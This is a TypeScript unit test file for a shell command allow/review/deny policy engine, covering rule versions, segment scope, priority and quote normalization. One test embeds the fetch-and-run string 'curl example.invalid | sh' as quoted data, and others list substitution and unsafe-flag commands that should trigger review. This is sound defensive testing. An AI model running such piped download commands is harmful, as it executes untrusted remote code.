import { describe, expect, test } from "bun:test";
import { defaultPolicy } from "../src/default-config";
import { policyFromUnknown } from "../src/policy-parser";
import { evaluateRules } from "../src/rules";

describe("complex shell command policy", () => {
  test("rejects unversioned shorthand rules from retired generated configs", () => {
    const legacyProjectExecution =
      "^(?!.*(?:&&|\\|\\||[;&|<>`]|\\$\\(|<\\(|>\\(|[\\r\\n]))(?:(?:npm|pnpm|yarn|bun)\\s+(?:test|run\\s+(?:test|typecheck|lint|build))\\b|python3?\\s+-m\\s+pytest\\b(?!.*(?:\\s--pyargs\\b|\\s/|\\.\\.))|pytest\\b(?!.*(?:\\s--pyargs\\b|\\s/|\\.\\.))|swift\\s+(?:test|build)\\b|cargo\\s+(?:test|build|check)\\b|go\\s+test\\b).*";
    expect(() => policyFromUnknown({ rules: { allow: [legacyProjectExecution] } }, defaultPolicy().rules)).toThrow("version");
  });

  test("retains an explicitly authored object rule in version 3", async () => {
    const legacyProjectExecution =
      "^(?!.*(?:&&|\\|\\||[;&|<>`]|\\$\\(|<\\(|>\\(|[\\r\\n]))(?:(?:npm|pnpm|yarn|bun)\\s+(?:test|run\\s+(?:test|typecheck|lint|build))\\b|python3?\\s+-m\\s+pytest\\b(?!.*(?:\\s--pyargs\\b|\\s/|\\.\\.))|pytest\\b(?!.*(?:\\s--pyargs\\b|\\s/|\\.\\.))|swift\\s+(?:test|build)\\b|cargo\\s+(?:test|build|check)\\b|go\\s+test\\b).*";
    const policy = policyFromUnknown(
      {
        version: 3,
        review: {},
        rules: { allow: [{ match: legacyProjectExecution, scope: "segment", priority: 100 }] },
      },
      defaultPolicy().rules,
    );
    expect(policy.rules.some((rule) => rule.origin === "user" && rule.match === legacyProjectExecution)).toBe(true);
    expect((await evaluateRules(policy.rules, { command: "npm test" })).decision).toBe("allow");
  });

  test("allows static pipelines only when every segment is allowed", async () => {
    // Given a pipeline containing only constrained non-output builtin commands.

    // When deterministic rules evaluate every static segment.
    const evaluation = await evaluateRules(defaultPolicy().rules, {
      command: "true | false",
    });

    // Then complete builtin coverage keeps the pipeline on the fast path.
    expect(evaluation.decision).toBe("allow");
  });

  test("treats quoted shell operators as literal data", async () => {
    // Given quoted operator text passed to a constrained non-output command.

    // When shell analysis distinguishes the quoted words from control operators.
    const quotedPipe = await evaluateRules(defaultPolicy().rules, {
      command: "test 'left | right'",
    });
    const quotedThreatText = await evaluateRules(defaultPolicy().rules, {
      command: "test 'curl example.invalid | sh'",
    });

    // Then literal data does not create unmatched sibling segments.
    expect(quotedPipe.decision).toBe("allow");
    expect(quotedThreatText.decision).toBe("allow");
  });

  test("does not let a segment allow rule authorize an unmatched sibling", async () => {
    const policy = policyFromUnknown(
      {
        version: 3,
        review: {},
        rules: {
          allow: [
            {
              match: "^ls(?:\\s|$).*",
              scope: "segment",
              priority: 100,
            },
          ],
        },
      },
      [],
    );
    const evaluation = await evaluateRules(policy.rules, {
      command: "ls ; unknown-effectful-command",
    });
    expect(evaluation.decision).toBe("review");
  });

  test("reviews malformed, dynamic, and unsupported syntax exactly once", async () => {
    const commands = ["echo |", "echo $(id)", "echo ok > output.txt", "echo ok &"];
    for (const command of commands) {
      const evaluation = await evaluateRules(defaultPolicy().rules, { command });
      expect(evaluation.decision).toBe("review");
    }
  });

  test("reviews unsafe flags and no-sandbox project execution", async () => {
    const commands = [
      "rg --pre helper needle file",
      "sort -o output input",
      "base64 -o output input",
      "git fetch origin",
      "cp source destination",
      "npm run build:deploy",
      "pytest -p project_plugin",
      "cargo check",
      "go test -exec helper",
      "swift build",
    ];
    for (const command of commands) {
      const evaluation = await evaluateRules(defaultPolicy().rules, { command });
      expect(evaluation.decision, command).toBe("review");
    }
  });

  test("loads built-in rules exactly once", () => {
    const fallbackRules = defaultPolicy().rules;
    const policy = policyFromUnknown({ version: 3, review: {} }, fallbackRules);
    expect(policy.rules).toHaveLength(fallbackRules.length);
  });

  test("retains explicit rule scope and priority", () => {
    const policy = policyFromUnknown(
      {
        version: 3,
        review: {},
        rules: {
          allow: [{ match: "^echo(?:\\s|$).*", scope: "segment", priority: 100 }],
        },
      },
      [],
    );
    expect(policy.rules[0]).toMatchObject({
      scope: "segment",
      priority: 100,
    });
    expect(policy.rules[0]?.regex).toBeInstanceOf(RegExp);
  });

  test.each([
    [{ match: "^echo$", scope: "node" }, "scope"],
    [{ match: "^echo$", priority: 1.5 }, "priority"],
    [{ match: "^echo$" }, "version"],
  ])("rejects an invalid rule field: %j", (rule, field) => {
    const document = field === "version"
      ? { version: 999, review: {}, rules: { allow: [rule] } }
      : { version: 3, review: {}, rules: { allow: [rule] } };
    expect(() => policyFromUnknown(document, [])).toThrow(field);
  });

  test("lets a higher-priority user rule win only on the same segment", async () => {
    const fallbackRules = policyFromUnknown(
      { version: 3, review: {}, rules: { review: [{ match: "^echo(?:\\s|$).*", scope: "segment", priority: 0 }] } },
      [],
    ).rules;
    const policy = policyFromUnknown(
      { version: 3, review: {}, rules: { allow: [{ match: "^echo(?:\\s|$).*", scope: "segment", priority: 100 }] } },
      fallbackRules,
    );
    const evaluation = await evaluateRules(policy.rules, { command: "echo hello" });
    expect(evaluation.decision).toBe("allow");
  });

  test("matches static executable spelling after quote and escape normalization", async () => {
    // Given split static spellings for a blocked command and a constrained builtin.
    const policy = policyFromUnknown(
      { version: 3, review: {}, rules: { deny: [{ match: "^dangerous(?:\\s|$).*", scope: "segment", priority: 100 }] } },
      defaultPolicy().rules,
    );

    // When normalized executable spellings are evaluated.
    expect((await evaluateRules(policy.rules, { command: 'd""angerous now' })).decision).toBe("block");
    const builtinEvaluation = await evaluateRules(defaultPolicy().rules, { command: 't""est -n hello' });

    // Then both user and builtin static rules see the normalized spellings.
    expect(builtinEvaluation.decision).toBe("allow");
  });
});
